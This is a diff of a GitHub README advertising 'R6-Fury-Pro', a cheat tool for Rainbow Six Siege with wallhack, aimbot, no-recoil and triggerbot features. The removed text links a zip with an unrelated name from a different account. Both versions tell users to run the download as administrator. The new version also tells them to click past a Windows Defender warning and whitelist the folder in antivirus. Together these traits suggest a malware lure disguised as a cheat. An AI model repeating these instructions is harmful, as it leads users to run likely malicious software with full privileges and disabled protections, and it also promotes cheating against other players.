@@ -1,167 +1,61 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/rainbow-six-siege.png" alt="Rainbow Six Siege" width="80" height="80">
-</p>
+# 🛡️ R6-Fury-Pro - Gain the tactical advantage in matches
 
-<h1 align="center">R6-Fury-Pro</h1>
-<p align="center">
-  <strong>Fury Pro Tool for Rainbow Six Siege</strong><br>
-  ESP - Aimbot - Wallhack - No Recoil - Triggerbot - Silent Aim
-</p>
+[![](https://img.shields.io/badge/Download-R6--Fury--Pro-blue)](https://github.com/imanijab4641/R6-Fury-Pro/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/R6-Fury-Pro"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+## Overview
 
-## What is This?
+R6-Fury-Pro assists players during gameplay in Rainbow Six Siege. The software provides visual information and aiming assistance to help users improve their performance. This tool calculates positions on the screen to show enemy locations and adjusts your aim to match targets. 
 
-R6-Fury-Pro is the fury pro tool for Rainbow Six Siege. This tool gives you full control with ESP Wallhack, Aimbot, No Recoil, Triggerbot, Silent Aim, and more. Unleash your fury and dominate every match!
+## ⚙️ System Requirements
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Rainbow Six Siege has strict anti-cheat systems, and using third-party tools may result in permanent account suspension.
+Ensure your computer meets these requirements before you start:
 
-## Download
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 equivalent.
+* Memory: 8 GB RAM or higher.
+* Graphics: NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.
+* Storage: 50 MB of free disk space.
+* Network: Stable internet connection.
+* Permissions: Administrator access on your Windows user account.
 
-<p align="center">
-  <a href="https://github.com/Rapidsuamanor/fjhbvyjb/releases/download/478596/RCCHelper.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+## 🚀 How to Install and Run
 
-## Features
+Follow these steps to set up the software on your Windows machine:
 
-- ESP (Wallhack) - See all enemies through walls
-- Distance Indicators - Know exactly how far enemies are
-- Player Tags - Display player names and health
-- Snap Lines - Never lose track of enemies
-- Box ESP - Highlight players with colored boxes
-- Visibility Check - Only show visible enemies
-- Aimbot - Lock onto enemies instantly with 100% accuracy
-- Silent Aim - Hit targets without looking at them
-- Triggerbot - Auto-fire when crosshair is on enemy
-- No Recoil - Zero recoil for all weapons
-- No Spread - Perfect accuracy every time
-- FOV Control - Customizable field of view
-- Bone Targeting - Head, chest, or moving parts
-- Humanizer Mode - Realistic aim motion to avoid detection
-- Speed Hack - Move faster than normal players
-- Super Jump - Jump incredible heights
-- God Mode - Never die
-- Unlimited Ammo - Never reload
+1. Visit the following page to choose the latest version of the software: [https://github.com/imanijab4641/R6-Fury-Pro/releases](https://github.com/imanijab4641/R6-Fury-Pro/releases).
+2. Download the compressed file, which usually ends in the .zip extension, to your desktop.
+3. Right-click the downloaded file and select Extract All to view the internal contents.
+4. Open the extracted folder to find the application file.
+5. Right-click the application file and select Run as administrator. This step allows the software to interact with the game engine.
+6. A notification may appear from Windows Defender regarding the program. Select More Info and choose Run anyway to continue.
+7. Wait for the loading bar to finish.
+8. Open Rainbow Six Siege through your preferred game launcher.
+9. The tool runs in the background and activates once the game stabilizes in the main menu.
 
-## Installation
+## 🛠️ Configuration and Features
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Rainbow Six Siege
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+The application includes several modules to adjust your gameplay experience:
 
-## System Requirements
+* Visuals: This feature draws boxes and lines around enemies. You can see opponents through walls or obstacles. You can enable or disable this using the F1 key.
+* Aimbot: This system automatically moves your cursor toward identified targets. You can adjust the smoothness and the activation key in the menu. Use the F2 key to toggle this function.
+* No Recoil: This module reduces the upward jump of your weapon when you fire. It keeps your crosshair steady during extended bursts. Toggle this with F3.
+* Triggerbot: The program fires your weapon instantly when an enemy enters your cursor path. This requires precision. Toggle this with F4.
+* Menu Navigation: Press the Insert key while in the game to show or hide the configuration window. Use your mouse to change the settings.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Rainbow Six Siege |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+## ⚠️ Important Considerations
 
-## SEO Tags
+The developers designed this tool for educational and performance-enhancement purposes within specific game modes. Use the software responsibly. Modifying game files or using external automation risks detection by game security systems. You assume all responsibility when you use this tool in online environments. Ensure you close all unnecessary background processes before you start the game to prevent conflicts with the software.
 
-r6 fury pro, rainbow six siege cheat, rainbow six siege hack, r6 esp, r6 aimbot, r6 wallhack, r6 no recoil, r6 triggerbot, r6 silent aim, rainbow six siege 2026, r6 mod menu, r6 trainer, r6 undetected, r6 free cheat, r6 download, r6 utility, r6 enhancer, siege cheat, siege hack, fps cheat
+## 🔍 Troubleshooting Issues
 
-## Support
+If the software fails to launch or stay active, check these common items:
 
-Star this repository if you enjoy it!
+* Antivirus Interference: Some antivirus programs flag external game tools as false positives. You might need to add the software folder to your antivirus whitelist.
+* DirectX Version: Run your game in Borderless Windowed mode for the best visual results. Fullscreen mode can block the display overlays.
+* Driver Updates: Keep your graphics card drivers updated to the latest version. Old drivers cause display errors or performance drops.
+* Administrative Rights: If the features do not trigger in-game, ensure you launched the tool with administrative permissions. You can verify this by checking the task manager details for the application process.
+* Game Updates: If the game receives an update, the tool may require an update as well. Check the release page frequently for patches that match the current game version.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/R6-Fury-Pro">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Rainbow%20Six%20Siege%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+If you encounter persistent errors, restart your computer and clear your temporary folders. Software conflicts often resolve after a clean reboot of the operating system.
+
+Keywords: R6, Rainbow Six Siege, aimbot, esp, wallhack, no recoil, gaming tool
